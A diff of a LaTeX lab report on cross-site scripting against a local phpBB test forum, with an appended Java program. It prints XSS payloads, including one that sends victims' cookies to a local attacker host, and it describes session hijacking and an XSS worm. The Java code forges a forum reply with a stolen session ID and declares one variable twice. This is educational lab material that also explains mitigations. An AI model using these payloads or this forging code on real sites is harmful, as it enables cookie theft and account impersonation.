@@ -345,34 +345,46 @@ This attack is especially dangerous, as we could perform any command on hijacked
 \subsection{Posting a Malicious Message to Display an Alert Window}
 We succeeded in invoking the warning message with the following code:\\
 \begin{center}\texttt{<script>alert('Vulnerable!');</script>}\end{center}
+Because the user input is not correctly escaped, we place a valid script tag in the message. The browser seeing the tag will just execute the script in side. Hence we see the following message:\\
 \includegraphics[width=.95\textwidth]{gfx/xss/task1.png}
 
+
 \subsection{Posting a Malicious Message to Display Cookies}
-We succeeded in displaying personal cookies with the following code:\\
+We placed code to display cookie in the script tag, similarly to the first task. We succeeded in displaying our own cookie with the following code:\\
 \begin{center}\texttt{<script>alert(document.cookie);</script>\\Hello Everybody,\\Welcome to this message board.}\end{center}
 
+And we could see the cookie when viewing the message:\\
 \includegraphics[width=.95\textwidth]{gfx/xss/task2.png}
 
 \subsection{Stealing Cookies from the Victim's Machine}
 Using \texttt{echoserv} program on one of the machines in the same local network as the www server we were able to capture the cookie of a person viewing malicious post:\\
 
 \begin{center}\texttt{Hello Folks,\\<script>document.write('<img src=http://10.0.2.5:5555?c='+ escape(document.cookie) + '   >'); </script>\\This script is to test XSS. Thanks.}\end{center}
-
+This script creates image element. The browsers attempts a HTTP GET request to fetch the image. However, the url of the image is the address of our machine that captures a cookie. As parameter to the request we add a cookie encoded in a string.
 \includegraphics[width=.95\textwidth]{gfx/xss/task3-alice.png}\\[1cm]
 
+Then on attacker machine we can observe incoming request, therefore we are able to steal a cookie of anyone viewing the message.\\
 \includegraphics[width=.95\textwidth]{gfx/xss/task3-alice-cookie-stolen.png}
 
 \subsection{Impersonating the Victim using the Stolen Cookies}
-We wrote a \texttt{Java} program which uses stolen cookie to post messages on behalf of cookie owner. The source code is available in \emph{appendix}~\ref{app:java}.\\
+We wrote a \texttt{Java} program which uses stolen cookie to post messages on behalf of cookie owner. As a user we created a test message:\\
 
-\includegraphics[width=.95\textwidth]{gfx/xss/task4-attack-done.png}\\[1cm]
+\includegraphics[width=.95\textwidth]{gfx/xss/task4-see-headers.png}\\[1cm]
+
+We observed the reply to a thread is created using LiveHTTPHeaders plugin to Firefox.\\
 
 \includegraphics[width=.95\textwidth]{gfx/xss/task4-inspecting-headers.png}\\[1cm]
 
-\includegraphics[width=.95\textwidth]{gfx/xss/task4-see-headers.png}
+We used the information to change the provided Java program to add a reply on behalf of the user that we used to steal the cookie from. The cookie contains a session ID. Session is opened when user is logged in and in case of php BB, it seems to be persisted on the server. The ID of the session is stored in user's cookie. We parse the session ID from the cookie and add it to the request, which is what happens in real request as we observed. Hence when we steal the cookie, we can "recreate" the session without the need to log in. The source code of our attack is available in \emph{appendix}~\ref{app:java}. The program sends a reply with content ``AllYourBaseAreBelongToUs''. After running the program we could see the message being successfully posted on behalf of bob.\\
+
+\includegraphics[width=.95\textwidth]{gfx/xss/task4-attack-done.png}
+
+Even if we had the mechanism to prevent Cross Site Request Forgery, opening a gate for XSS attacks would make it possible to steal authenticity tokens, therefore it is important to correctly escape user input~\cite{csrf}.
+
+Another way to make it difficult to steal session cookies using JavaScript is to mark cookies as "httponly" so that they can be only read during a HTTP request and couldn't be inspected using JavaScript~\cite{httponly}.
 
 \subsection{Writing an XSS Worm}
-We managed to append XSS worm to message on the forum forging posts on behalf of current logged-in user. The \texttt{JavaScript} source code is available in \emph{appendix}~\ref{app:javasc1}.\\
+We managed to append XSS worm to message on the forum forging posts on behalf of current logged-in user. Similarly, we had to parse user session id from the cookie and create a request in which we would append the stolen session ID. The \texttt{JavaScript} source code is available in \emph{appendix}~\ref{app:javasc1}.\\
 
 We also noticed that after refreshing multiple times, the response contains an error message: ``You cannot make another post so soon after your last; please try again in a short while.'' which is a mechanism in phpBB to prevent flooding message boards.
 
@@ -688,16 +700,36 @@ public class HTTPSimpleForge {
       urlConn.addRequestProperty("User-agent","Sun JDK 1.6");
       urlConn.addRequestProperty("Content-Type", "application/x-www-form-urlencoded");
       
+      // Stolen cookie from echoserv
       String stolenCookie = "phpbb2mysql_t%3Da%253A5%253A%257Bi%253A1%253Bi%253A1418225227%253Bi%253A2%253Bi%253A1418223204%253Bi%253A5%253Bi%253A1418223252%253Bi%253A6%253Bi%253A1418223310%253Bi%253A7%253Bi%253A1418225234%253B%257D%3B%20phpbb2mysql_data%3Da%253A2%253A%257Bs%253A11%253A%2522autologinid%2522%253Bs%253A0%253A%2522%2522%253Bs%253A6%253A%2522userid%2522%253Bs%253A1%253A%25224%2522%253B%257D%3B%20phpbb2mysql_sid%3D642b0037b1b4f81a4141e8fb505e50f6";
 
-
+	  // Remove HTML encoding
       String decodedCookie = URLDecoder.decode(stolenCookie); 
         
+      String decodedCookie = URLDecoder.decode(stolenCookie); 
+      
       System.out.println(decodedCookie);
-
+      
+      // Extract session id
+      String phpbb2mysql = "phpbb2mysql_sid=";
+      int sidIndex = decodedCookie.indexOf("phpbb2mysql_sid=") + phpbb2mysql.length();
+      String sid = decodedCookie.substring(sidIndex, decodedCookie.length()); 
+      
+      System.out.println(sid);
       urlConn.addRequestProperty("Cookie", decodedCookie);
       //HTTP Post Data which includes the information to be sent to the server.
-      String data="subject=AYBABTU&message=AllYourBaseAreBelongToUs&mode=reply&sid=642b0037b1b4f81a4141e8fb505e50f6&t=1&post=Submit";
+      String subject = "AYBABTU";
+      String message = "AllYourBaseAreBelongToUs";
+      String topicNumber = "1";
+      
+      // Add response data
+      String data="subject=" + subject;
+      data += "&message=" + message;
+      data += "&mode=reply";
+      
+      // Append session ID from the cookie
+      data += "&sid=" + sid;
+      data += "&t=" + topicNumber + "&post=Submit";
 
       // DoOutput flag of URL Connection should be set to true
       // to send HTTP POST message.
